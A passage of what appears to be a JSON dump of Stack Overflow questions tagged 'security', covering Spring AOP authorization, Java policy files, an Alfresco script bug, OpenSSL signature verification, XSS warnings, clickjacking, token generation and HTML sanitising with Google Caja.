@Around","body":"<p>Following up with this <a href=\"http://stackoverflow.com/questions/12248716/conditional-behavior-of-spring-aop-before-advice#comment16421693_12249543\">comment</a> of my previous question. I'm trying to throw an exception from the <code>@Around</code> advice, and catch it within the callee class and/or method. But I'm getting this error:</p>\n\n<pre><code>Stacktraces\n\njava.lang.Exception: User not authorized\n    com.company.aspect.AuthorizeUserAspect.isAuthorized(AuthorizeUserAspect.java:77)\n    sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)\n    sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)\n    sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)\n    java.lang.reflect.Method.invoke(Method.java:616)\n    ...\n</code></pre>\n\n<p>The Aspect code is:</p>\n\n<pre><code>@Aspect\npublic class AuthorizeUserAspect {\n    @AuthoWired\n    private UserService service;\n\n    @Pointcut(\"@annotation(module)\")\n    public void authorizeBeforeExecution(AuthorizeUser module) {}\n\n    @Around(value = \"authorizeBeforeExecution(module)\", argNames=\"module\")\n    public Object isAuthorized(ProceddingJoinPoint jp, AuthorizeUser module) throws Throwable {\n        // Check if the user has permission or not\n        service.checkUser();\n\n        if ( /* User has NOT permission */ ) {\n            throw new MyCustomException(\"User not authorized\"); // =&gt; this is line 77\n        }\n\n        return jp.proceed();\n    }\n}\n</code></pre>\n\n<p>and the Struts's based UI action code is:</p>\n\n<pre><code>@Component\npublic class DashboardAction extends ActionSupport {\n    @Override\n    @AuthorizeUser\n    public String execute() {\n        ...\n    }\n\n    private void showAccessDenied() {\n       ...\n    }\n}\n</code></pre>\n\n<p>The question is How or Where I can catch that exception to execute <code>showAccessDenied()</code>?</p>\n"},{"tags":["java","security","policy"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":65,"score":0,"question_id":12276710,"title":"Java Argument to specify Java.Policy file","body":"<p>I am trying to load different policy files to security properties file and set an policy file according to the context.</p>\n\n<p>To give little more context, I'm setting different policy files for different users in my system.Therefore I had to first load the policy files in to the security properties file and set the policy file in the run time for current user.</p>\n\n<p>I thought of using System.setProperty() to load the policy files, but then I couldn't set the policy file at run time with the method Policy.setPolicy(). I really don't no where I'm going wrong.  Here's to hoping one of you has the answer!</p>\n\n<ol>\n<li>How to set and run a policy file with in a pool of policy files?  </li>\n<li>Can I use <code>System.setProperty()</code> to set the policy files and <code>setPolicy()</code> to apply it for the run time environment? </li>\n</ol>\n"},{"tags":["javascript","security","debugging","node.js","alfresco"],"answer_count":5,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":509,"score":4,"question_id":12077597,"title":"Javascript to Dynamically Create Spaces/Folders in Alfresco Doesn't Work Correctly","body":"<p>I am currently working with Alfresco 4.0.d community edition (I also tried this on Alfresco 4.0.c community edition) on a Oracle Linux 6 64bit virtual machine, using Firefox as my browser.</p>\n\n<p>Most recently, I had been attempting to create a script which could be executed via a rule that would dynamically create sub-folders as new items entered a space/folder.</p>\n\n<p>Essentially, say you have a newly created piece of content called <strong>fileOne</strong>. This file will sit in a space called <strong>mainFolder</strong>, and when a rule is run on the file to execute a script, the script will look to see if sub-folders exist based on the <strong>title</strong> and <strong>author</strong> values of the file. If not, it will create sub-folders within that <strong>mainFolder</strong> based on the <strong>title value</strong> --> sub-folder, and <strong>author value</strong> --> sub-sub-folder of that file. And then I want that content/file to be moved over to that either that existing or newly created sub-sub folder.</p>\n\n<p>Ultimately I want something that looks like:</p>\n\n<pre><code>Space: mainFolder\n|---&gt; Content: fileOne --&gt; Properties: Name, Title, Author\n|---&gt; Space: Title\n      |---&gt; Space: Author\n            |---&gt; Content: fileOne --&gt; Properties: Name, Title, Author \n</code></pre>\n\n<p>Below is the script...</p>\n\n<pre><code>function main()\n{\n    //mainFolder space/folder MUST exist under companyhome.\n    var rootSpaceName = companyhome.childByNamePath(\"mainFolder\");\n\n    if(rootSpaceName == null)\n    { \n        logger.log(\"Company Home/mainFolder does not exist, so we have nothing to do.\");\n        return;\n    }\n    else\n    {\n        logger.log(\"Company Home/mainFolder exists, so carry on our process.\");\n\n        var childList = rootSpaceName.children;\n        var count = childList.length;\n        var seconds = new Date().getTime() / 1000;\n\n        if(count == 0)\n        {\n            logger.log(\"Company Home/mainFolder does not have child, nothing to do.\");\n            return;\n        }\n        else\n        {\n            for(var i = 0; i &lt; count; i++)\n            {\n                // File Title MUST exist.\n                var childTitle = childList[i].properties.title;\n\n                if(childTitle == null)\n                {\n                    childTitle = \"New Title \" + seconds;\n                }\n\n                // File Author MUST exist.\n                var childAuthor = childList[i].properties.author;\n\n                if(childAuthor == null)\n                {\n                    childAuthor = \"New Author \" + seconds;\n                }\n\n                var child = childList[i];\n                logger.log(\"This child is: \" + child);\n\n                if(child.isContainer == false)\n                {\n                    for(var j = 0; j &lt; count; j++)\n                    {\n                        var newChildName = childList[j].properties.name;\n                        logger.log(\"New child name: \" + newChildName);\n                        var newChild = childList[j];\n\n                        if((newChild.isContainer == true) &amp;&amp; (childTitle == newChildName))\n                        {\n                            var newSpaceName = rootSpaceName.childByNamePath(newChildName);\n                            var newChildList = newSpaceName.children;\n                            var newCount = newChildList.length;\n\n                            for(var k = 0; k &lt; newCount; k++)\n                            {\n                                var newNewChildName = newChildList[k].properties.name;\n                                var newNewChildAuthor = newChildList[k].properties.author;\n                                var newNewChild = newChildList[k];\n\n                                if((newNewChild.isContainer == true) &amp;&amp; (newNewChildAuthor == childAuthor))\n                                {\n                                    var currentSpace = newSpaceName.childByNamePath(newNewChildName);\n                                    child.move(currentSpace);\n                                }\n                            }\n                        }\n                        else\n                        {\n                            // If title folder is already created, not need to create again.\n                            var newSpaceName = companyhome.childByNamePath(\"mainFolder/\" + childTitle);\n\n                            if(newSpaceName == null)\n                            {\n                                newSpaceName = rootSpaceName.createFolder(childTitle);\n                                logger.log(\"mainFolder/\" + childTitle + \" is created.\");\n                            }\n\n                            // If author folder is already created, not need to create again.\n                            var newNewSpaceName = companyhome.childByNamePath(\"mainFolder/\" + childTitle + \"/\" + childAuthor);\n                            if(newNewSpaceName == null)\n                            {\n                                newNewSpaceName = newSpaceName.createFolder(childAuthor);\n                                logger.log(\"mainFolder/\" + childTitle + \"/\" + childAuthor + \" is created.\");\n                            }\n\n                            child.move(newNewSpaceName);\n                            logger.log(\"Moving file \" + child.properties.name);\n                        }\n\n                    }\n\n                }\n\n            }\n        }\n    }\n    return;\n}\n\nmain();\n</code></pre>\n\n<p>So to test this, step-by-step here is what I do:</p>\n\n<ol>\n<li>I click on <strong>Company Home</strong>.</li>\n<li>I click on <strong>Create</strong>, <strong>Create Space</strong>.</li>\n<li>I then create a space called <strong>mainFolder</strong> (this is under Company Home).</li>\n<li>I then click on the newly created folder, then click on <strong>More Actions</strong>, <strong>Manage Content Rules</strong>.</li>\n<li>Then I click on <strong>Create Rule</strong>.\n<br>5a. Where it tells me to select a condition, I choose <strong>All Items</strong>, then I click <strong>Add to List</strong>, then I hit <strong>Next</strong>.\n<br><br>5b. Where it now tells me to select an action, I choose <strong>Execute Script</strong>, then I click <strong>Set Values and Add</strong>, which allows me to choose the script called <strong>new-create-folders.js</strong> which I had previously added to the <strong>Scripts</strong> folder within the <strong>Data Dictionary</strong>. Then I click <strong>OK</strong>, and then <strong>Next</strong>.\n<br><br>5c. Here where it asks me for the <strong>type</strong>, I choose <strong>Items are updated</strong>. I then enter a title like <strong>create folders rule</strong>. And finally I check <strong>Run rule in the background</strong>, then I hit <strong>Next</strong>.\n<br><br>5d. Now I click <strong>Finish</strong> to finalize my rule.</li>\n<li>Now with the rule created, I click <strong>Create</strong>, <strong>Create Content</strong>.\n<br><br>6a. I give my content a name like <strong>name001</strong>, then I hit <strong>Next</strong>, then I enter a title like <strong>title001</strong> and an author like <strong>author001</strong>. Then I hit <strong>OK</strong>.</li>\n</ol>\n\n<p>What happens now has got me confused; it creates one sub folder called <strong>title001</strong> like I wanted it to, and within that sub-folder it creates another folder called <strong>author001</strong>, and within that folder the file called <strong>name001</strong> has been moved. And that is sort of how I want it to work, but there are still problems. Under the <strong>mainFolder</strong>, there is also a new sub-folder called <strong>New Title 1346102873.393  New Title 1346102873.393</strong> with a folder inside of that called <strong>New Author 1346102873.393</strong>, but there is no file inside of that folder. And I don't know why this folder is created when I only added one piece of content to the <strong>mainFolder</strong>? Also, now that the folders have been created, the rule also looks to have been deleted from the <strong>mainFolder</strong>, i.e. there are no longer any rules applied to the folder. And when I go back to create the rule again on the <strong>mainFolder</strong>, I get the error: <code>Failed to create Rule due to error: null</code>. And below are the errors I get in the log files...</p>\n\n<p><strong>Output/Errors from Alfresco Log</strong></p>\n\n<pre><code>17:27:51,373 DEBUG [org.alfresco.repo.jscript.RhinoScriptProcessor] Imports resolved, adding resource '_root\n17:27:53,389 DEBUG [org.alfresco.repo.jscript.ScriptLogger] Company Home/mainFolder exists, so carry on our process.\n17:27:53,400 DEBUG [org.alfresco.repo.jscript.ScriptLogger] This child is: Node Type: {http://www.alfresco.org/model/content/1.0}systemfolder, Node Aspects: [{http://www.alfresco.org/model/content/1.0}auditable, {http://www.alfresco.org/model/system/1.0}referenceable, {http://www.alfresco.org/model/system/1.0}localized]\n17:27:53,400 DEBUG [org.alfresco.repo.jscript.ScriptLogger] New child name: b8ea2cb0-6fb6-481e-bb7b-d5364d9c509e\n17:27:53,422 DEBUG [org.alfresco.repo.jscript.ScriptLogger] mainFolder/New Title 1346102873.393 is created.\n17:27:53,439 DEBUG [org.alfresco.repo.jscript.ScriptLogger] mainFolder/New Title 1346102873.393/New Author 1346102873.393 is created.\n17:27:53,498 DEBUG [org.alfresco.repo.jscript.ScriptLogger] Moving file b8ea2cb0-6fb6-481e-bb7b-d5364d9c509e\n17:27:53,499 DEBUG [org.alfresco.repo.jscript.ScriptLogger] New child name: name001\n17:27:53,523 DEBUG [org.alfresco.repo.jscript.ScriptLogger] Moving file b8ea2cb0-6fb6-481e-bb7b-d5364d9c509e\n17:27:53,524 DEBUG [org.alfresco.repo.jscript.ScriptLogger] This child is: Node Type: {http://www.alfresco.org/model/content/1.0}content, Node Aspects: [{http://www.alfresco.org/model/content/1.0}auditable, {http://www.alfresco.org/model/system/1.0}referenceable, {http://www.alfresco.org/model/content/1.0}titled, {http://www.alfresco.org/model/content/1.0}author, {http://www.alfresco.org/model/system/1.0}localized, {http://www.alfresco.org/model/application/1.0}inlineeditable]\n17:27:53,524 DEBUG [org.alfresco.repo.jscript.ScriptLogger] New child name: b8ea2cb0-6fb6-481e-bb7b-d5364d9c509e\n17:27:53,534 DEBUG [org.alfresco.repo.jscript.ScriptLogger] mainFolder/title001 is created.\n17:27:53,546 DEBUG [org.alfresco.repo.jscript.ScriptLogger] mainFolder/title001/author001 is created.\n17:27:53,561 DEBUG [org.alfresco.repo.jscript.ScriptLogger] Moving file name001\n17:27:53,561 DEBUG [org.alfresco.repo.jscript.ScriptLogger] New child name: name001\n17:27:53,577 DEBUG [org.alfresco.repo.jscript.ScriptLogger] Moving file name001\n17:27:53,578 DEBUG [org.alfresco.repo.jscript.RhinoScriptProcessor] Time to execute script: 1976.9988ms\n17:31:13,385 ERROR [org.alfresco.web.ui.common.Utils] Failed to create Rule due to error: null\njava.lang.NullPointerException\n    at org.alfresco.repo.rule.RuleServiceImpl.getLinkedToRuleNode(RuleServiceImpl.java:1516)\n    at org.alfresco.repo.rule.RuleServiceImpl.isLinkedToRuleNode(RuleServiceImpl.java:1504)\n    at org.alfresco.repo.rule.RuleServiceImpl.checkForLinkedRules(RuleServiceImpl.java:947)\n    at org.alfresco.repo.rule.RuleServiceImpl.saveRule(RuleServiceImpl.java:740)\n    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)\n    at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)\n    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)\n    at java.lang.reflect.Method.invoke(Method.java:597)\n    at org.springframework.aop.support.AopUtils.invokeJoinpointUsingReflection(AopUtils.java:309)\n    at org.springframework.aop.framework.ReflectiveMethodInvocation.invokeJoinpoint(ReflectiveMethodInvocation.java:183)\n    at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:150)\n    at org.alfresco.repo.security.permissions.impl.AlwaysProceedMethodInterceptor.invoke(AlwaysProceedMethodInterceptor.java:34)\n    at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:172)\n    at org.alfresco.repo.security.permissions.impl.ExceptionTranslatorMethodInterceptor.invoke(ExceptionTranslatorMethodInterceptor.java:46)\n    at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:172)\n    at org.alfresco.repo.audit.AuditMethodInterceptor.invoke(AuditMethodInterceptor.java:147)\n    at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:172)\n    at org.springframework.transaction.interceptor.TransactionInterceptor.invoke(TransactionInterceptor.java:110)\n    at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:172)\n    at org.springframework.aop.framework.JdkDynamicAopProxy.invoke(JdkDynamicAopProxy.java:202)\n    at $Proxy53.saveRule(Unknown Source)\n    at org.alfresco.web.bean.rules.CreateRuleWizard.finishImpl(CreateRuleWizard.java:148)\n    at org.alfresco.web.bean.dialog.BaseDialogBean$1.execute(BaseDialogBean.java:123)\n    at org.alfresco.web.bean.dialog.BaseDialogBean$1.execute(BaseDialogBean.java:119)\n    at org.alfresco.repo.transaction.RetryingTransactionHelper.doInTransaction(RetryingTransactionHelper.java:388)\n    at org.alfresco.web.bean.dialog.BaseDialogBean.finish(BaseDialogBean.java:129)\n    at org.alfresco.web.bean.wizard.WizardManager.finish(WizardManager.java:593)\n    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)\n    at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)\n    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)\n    at java.lang.reflect.Method.invoke(Method.java:597)\n    at org.apache.myfaces.el.MethodBindingImpl.invoke(MethodBindingImpl.java:132)\n    at org.apache.myfaces.application.ActionListenerImpl.processAction(ActionListenerImpl.java:61)\n    at javax.faces.component.UICommand.broadcast(UICommand.java:151)\n    at javax.faces.component.UIViewRoot._broadcastForPhase(UIViewRoot.java:115)\n    at javax.faces.component.UIViewRoot.processApplication(UIViewRoot.java:191)\n    at org.apache.myfaces.lifecycle.InvokeApplicationExecutor.execute(InvokeApplicationExecutor.java:32)\n    at org.apache.myfaces.lifecycle.LifecycleImpl.executePhase(LifecycleImpl.java:105)\n    at org.apache.myfaces.lifecycle.LifecycleImpl.execute(LifecycleImpl.java:80)\n    at javax.faces.webapp.FacesServlet.service(FacesServlet.java:143)\n    at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:290)\n    at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:206)\n    at org.alfresco.repo.web.filter.beans.SessionSynchronizedFilter.doFilter(SessionSynchronizedFilter.java:67)\n    at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:235)\n    at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:206)\n    at org.alfresco.web.app.servlet.AuthenticationFilter.doFilter(AuthenticationFilter.java:104)\n    at sun.reflect.GeneratedMethodAccessor443.invoke(Unknown Source)\n    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)\n    at java.lang.reflect.Method.invoke(Method.java:597)\n    at org.alfresco.repo.management.subsystems.ChainingSubsystemProxyFactory$1.invoke(ChainingSubsystemProxyFactory.java:116)\n    at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:172)\n    at org.springframework.aop.framework.JdkDynamicAopProxy.invoke(JdkDynamicAopProxy.java:202)\n    at $Proxy238.doFilter(Unknown Source)\n    at org.alfresco.repo.web.filter.beans.BeanProxyFilter.doFilter(BeanProxyFilter.java:82)\n    at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:235)\n    at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:206)\n    at org.alfresco.repo.web.filter.beans.NullFilter.doFilter(NullFilter.java:68)\n    at sun.reflect.GeneratedMethodAccessor443.invoke(Unknown Source)\n    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)\n    at java.lang.reflect.Method.invoke(Method.java:597)\n    at org.alfresco.repo.management.subsystems.ChainingSubsystemProxyFactory$1.invoke(ChainingSubsystemProxyFactory.java:116)\n    at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:172)\n    at org.springframework.aop.framework.JdkDynamicAopProxy.invoke(JdkDynamicAopProxy.java:202)\n    at $Proxy238.doFilter(Unknown Source)\n    at org.alfresco.repo.web.filter.beans.BeanProxyFilter.doFilter(BeanProxyFilter.java:82)\n    at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:235)\n    at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:206)\n    at org.alfresco.web.app.servlet.GlobalLocalizationFilter.doFilter(GlobalLocalizationFilter.java:58)\n    at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:235)\n    at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:206)\n    at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:233)\n    at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:191)\n    at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:470)\n    at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:127)\n    at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:102)\n    at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:109)\n    at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:298)\n    at org.apache.coyote.http11.Http11Processor.process(Http11Processor.java:857)\n    at org.apache.coyote.http11.Http11Protocol$Http11ConnectionHandler.process(Http11Protocol.java:588)\n    at org.apache.tomcat.util.net.JIoEndpoint$Worker.run(JIoEndpoint.java:489)\n    at java.lang.Thread.run(Thread.java:662)\n</code></pre>\n\n<p>Does anyone know why that additional folder is being created, as well as why the rule is being deleted after it executes on the newly created piece of content, and why I cannot add a new rule to the folder after it first deletes the original rule?</p>\n"},{"tags":["php","security","openssl","digital-signature"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":1525,"score":1,"question_id":2926704,"title":"How to verify a digital signature with openssl","body":"<p>I'm using a thirdparty credit card processing service (Paybox) that, after a successful transaction, redirects back to the website with a signature in the URL as a security measure to prevent people from manipulating data. It's supposed to prove that the request originated from this service. So my success URL looks something like this:</p>\n\n<p>/success.php?signature=[HUGE HASH]</p>\n\n<p>I have no idea where to start with verifying this signature. This service does provide a public key, and I assume I need to create a private key, but I don't know much beyond that. </p>\n\n<p>I'm pretty good with linux, and I know I'll have to run some openssl commands. I'm writing the verification script in PHP, which also has native openssl() functions.</p>\n\n<p>If anyone could please push me in the right direction with some pseudo code, or even functional code, I'd be very grateful. Thanks.</p>\n"},{"tags":["android","security","in-app-purchase","in-app-billing","subscription"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":96,"score":1,"question_id":12270367,"title":"How to store subscription data for Android in-app billing?","body":"<p>I'm trying to implement in-app billing, where the only thing my app sells is a monthly subscription. I've gone pretty much copied the Dungeons example that Android provides and it works, but it seems overly complicated for the one thing I have to sell (and I know I shouldn't be copying it anyway).</p>\n\n<p>The Dungeons example has a PurchaseDatabase class that keeps track of all of the user's purchases. Since there is only one purchase in my app, rather than having a database, it seems like it would make more sense to just have something like a SharedPreference/boolean \"isPurchased\" and update/check for that when I start up the app... Now I don't really know much about security, but that just seems to ring warning bells and would probably be very hackable.</p>\n\n<p>So, how should I store/restore this one piece of data? What do I need to save and keep track of, anyway?</p>\n\n<p><strong>Edit: Found this <a href=\"http://stackoverflow.com/questions/12211255/in-app-billing-how-to-store-information-that-user-has-paid?rq=1\">In-app billing. How to store information that user has paid?</a> . It would seem that I should use a SharedPreference, but this question still stands: do I just save a boolean \"isPurchased\" or should I keep track of orderId, developerPayload, etc?</strong></p>\n"},{"tags":["security","competitions"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":43,"score":0,"question_id":12273023,"title":"How to prepare for CTF security wargame competition?","body":"<p>I am preparing for the Capture the Flag (CTF) competiton such as this one here, <a href=\"https://csawctf.poly.edu/\" rel=\"nofollow\">https://csawctf.poly.edu/</a>.  Any good recommendations, e.g study materials, books, links, etc.? </p>\n"},{"tags":["javascript","jquery","web-services","security","api"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":40,"score":0,"question_id":12272602,"title":"Javascript API using Object Literal?","body":"<p>I'm in the process of building an API of sorts (I call it an API because that's the closest thing I think it compares to, if I'm wrong on that feel free to chime in).  I believe this is actually just an Object Literal but as of right now it's serving its purpose.  Here is a stripped example of the code I'm dealing with:</p>\n\n<pre><code>MYAPI = {\n\n    \"options\": {\n            \"version\": \"0.1\"        \n    },\n    loadscript: function(scriptName, scriptVer){\n            scriptLoad = []; // Intend to allow multiple scripts to load with the same call\n\n            scriptList = {\n                    \"jquery\" : {\n                            \"1.7.2\": \"http://ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js\",\n                            \"1.8.0\": \"http://ajax.googleapis.com/ajax/libs/jquery/1.8.0/jquery.min.js\"\n                    }\n            };\n\n            for (var key in scriptList){ \n                if (scriptList.hasOwnProperty(key)) {\n                    if(key === scriptName){\n                        for(var subkey in scriptList[key]){\n                            if(scriptList[key].hasOwnProperty(subkey)){\n                                if(subkey === scriptVer){                            \n                                    scriptLoad.push(scriptList[key][subkey]);\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n\n            var scriptElem = document.createElement('SCRIPT'); \n            scriptElem.setAttribute('language', 'JavaScript'); \n            scriptElem.setAttribute('src', scriptLoad[0]);\n            console.log(scriptLoad[0]);\n            document.onreadystatechange = function () {\n                if (document.readyState == \"complete\") {\n                    document.body.appendChild(scriptElem);\n                }\n            };\n    }\n\n};\n</code></pre>\n\n<p>Example of use:</p>\n\n<pre><code>&lt;script type=\"text/javascript\" language=\"javascript\" src=\"http://www.mysite.com/scripts/myapi.js\"&gt;&lt;/script&gt;\n&lt;script type=\"text/javascript\" language=\"javascript\"&gt;\n    MYAPI.loadscript('jquery','1.7.2');\n&lt;/script&gt;\n</code></pre>\n\n<p>As stated earlier this is a very basic example, there will be lots more to this in the end.  Basically my questions are:</p>\n\n<ul>\n<li>In general is this a good method for going about this?  </li>\n<li>Do I pose any security risks to myself (The script host) or the user?</li>\n<li>Are there any pitfalls to this approach that may come back to bite me as I go along adding different functions or values?</li>\n</ul>\n\n<p>My primary concern come with cross origin issues and general security.  As you can see I'm loading the script from an external source, which in turn is loading another script from another source, and then dynamically loading it into the page.  As of now it's working but I'm not sure this will always be the case.</p>\n\n<p>I found bits and pieces of information that relate to what I'm looking for but nothing that covers everything (which worries me and makes me think I may be going in the wrong direction).</p>\n\n<p>If it helps, the intended reasoning for this is to allow programming consistency among a team of web developers.  If a script is found to be working well we would throw this into the \"API\" and all the developers would be able to utilize it across different sites.</p>\n"},{"tags":["java","security","scala","playframework","owasp"],"answer_count":1,"favorite_count":8,"up_vote_count":17,"down_vote_count":0,"view_count":1150,"score":17,"question_id":6382900,"title":"playframework owasp top 10","body":"<p>I'm thinking about using <a href=\"http://www.playframework.org/\" rel=\"nofollow\">Play</a> for a large-scale project, so, has anyone battle-tested Play framework for OWASP Top 10?  Are there any security problems you know of in Play framework?</p>\n"},{"tags":["ruby-on-rails","security","xss"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":52,"score":0,"question_id":12271218,"title":"params.merge and cross site scripting","body":"<p>I'm using <a href=\"http://brakemanscanner.org\" rel=\"nofollow\">Brakeman</a> to identify security issues. It's flagging up any links which use <code>params.merge</code> as a cross site scripting vulnerability. How can I sanitize something like the following? </p>\n\n<pre><code>  - @archives.each do |archive|\n    =  link_to \"FTP\", params.merge(:action =&gt; :ftp, :archive =&gt; archive, :recipient =&gt; \"company\")\n</code></pre>\n"},{"tags":["security","facebook-iframe","facebook-authentication","facebook-oauth","facebook-authorization"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":36,"score":1,"question_id":12271012,"title":"Can the permissions.request dialog be rendered within an iframe?","body":"<p><a href=\"https://developers.facebook.com/docs/reference/dialogs/\" rel=\"nofollow\">https://developers.facebook.com/docs/reference/dialogs/</a> Lists the various different Facebook dialogs, but \"permissions.request\" is not on the list.  The Permissions Request dialog has a URL of <a href=\"https://www.facebook.com/dialog/permissions.request\" rel=\"nofollow\">https://www.facebook.com/dialog/permissions.request</a>?...  The parameters consumed by this URL follow the same conventions as the other dialogs described in the above referenced documentation.</p>\n\n<p>The Permissions Request dialog currently works fine when rendered in an iframe (set the \"display\" parameter to \"iframe\" and also pass a valid \"access_token\" parameter).  Is this officially supported, or is it an oversight/bug?</p>\n\n<p>The oauth dialog is deliberately not allowed to be rendered within an iframe to prevent clickjacking.  Was the decision not to prevent clickjacking attacks on the Permissions Request dialog a deliberate one?</p>\n"},{"tags":["security","open-source"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":43,"score":0,"question_id":11440066,"title":"Finding a list of security advisory resources for open source platforms","body":"<p>I've been asked to provide a list of security advisory websites for a number of projects our clients use so they can keep on top of security issues.</p>\n\n<p>I looked for a Wordpress one and couldn't lay my fingers on how to stay on top of security issues, patches and hardening for wordpress.</p>\n\n<p>For Magento, Joomla, Drupal and others it was similarly non-obvious.</p>\n\n<p>Is there an authoritative or official resource where these (individually or together) might be listed? This isn't limited to Open Source.  I am interested in being able to stay on top of security notices about platforms our clients use on our servers.</p>\n\n<p>Can we make an SO one if there isn't?</p>\n\n<p>Thank you,\nMyStream</p>\n\n<p>RESOURCES:</p>\n\n<ul>\n<li><a href=\"http://cve.mitre.org/\" rel=\"nofollow\">Common Vulnerabilities and Exposures project (CVE)</a></li>\n<li><a href=\"http://seclists.org/fulldisclosure\" rel=\"nofollow\">http://seclists.org/fulldisclosure</a></li>\n<li><a href=\"http://packetstormsecurity.org/\" rel=\"nofollow\">http://packetstormsecurity.org/</a></li>\n<li><a href=\"http://www.securityfocus.com/bid/\" rel=\"nofollow\">http://www.securityfocus.com/bid/</a></li>\n<li><a href=\"http://www.exploit-db.com/\" rel=\"nofollow\">http://www.exploit-db.com/</a></li>\n</ul>\n"},{"tags":["php","security","hash","salt"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":375,"score":0,"question_id":6771084,"title":"Creating randomly generated, secure token and storing in database","body":"<p>I am trying to generate a unique token for every user on my site. The token is generated when the user registers, and will ideally be as secure as possble. What is the best method of doing so to allow me to display the token to the user?</p>\n\n<p>This token is NOT a password, and the user is not going to create it themselves. If I hash and salt it upon registration, I will not be able to retrieve it obviously, because it's hashed and salted. I want a simple way to do so via PHP and be able to display it to the user easily.</p>\n"},{"tags":["sql-server","security","authentication"],"answer_count":2,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":1425,"score":1,"question_id":888052,"title":"SQL Server 2008 Mixed Mixed Mode Security?","body":"<p>We are setting up a SQL Server 2008 Standard edition on a Web Server for the first time.  We normally have our SQL Server on our local Intranet and only use windows authentication.</p>\n\n<p>What is the best practise authentication mode for a web server?  Can I use Mixed mode without any security worries?  </p>\n"},{"tags":["javascript","html","security","google-caja"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":73,"score":1,"question_id":12253686,"title":"Google caja - Block malicious code","body":"<p>I need safe html on my website.</p>\n\n<p>I read though the caja guide and I am not sure if I understand the conecpt.</p>\n\n<p><a href=\"https://developers.google.com/caja/docs/gettingstarted/\" rel=\"nofollow\">https://developers.google.com/caja/docs/gettingstarted/</a></p>\n\n<p>I think it goes like this:</p>\n\n<ul>\n<li>User submits malicious content to my db</li>\n<li>I want to render it. Caja recognizes the malicious code and blocks it.</li>\n</ul>\n\n<p>But how do I render it though caja? They don't explain this on their page, they only show how to replace the code.</p>\n\n<pre><code>&lt;script type=\"text/javascript\"&gt;\n      document.getElementById('dynamicContent').innerHTML = 'Dynamic hello world';\n&lt;/script&gt;\n</code></pre>\n\n<p>Let's say our document would look like this</p>\n\n<pre><code>&lt;body&gt;\n    &lt;div class=\"input\"&gt;\n        &lt;h3&gt;User Input &lt;/h3&gt;\n        &lt;script&gt; alert(\"I am really bad!\"); &lt;/script&gt;\n    &lt;/div&gt;\n\n    &lt;div class=\"input\"&gt;\n        &lt;h3&gt;User Input &lt;/h3&gt;\n        &lt;p&gt; I am safe HTML!&lt;/p&gt;\n    &lt;/div&gt;\n&lt;/body&gt;\n</code></pre>\n\n<p>How would I tell caja to block the script tag?</p>\n"},{"tags":["web-services","security","authentication","amazon-s3","hmac"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":84,"score":1,"question_id":12216321,"title":"Amazon rest service authentication and security","body":"<p>I was reading about amazon's authentication process, and they use a custom process wich signs each request.</p>\n\n<ul>\n<li><p>I still don't understand how signing every requests 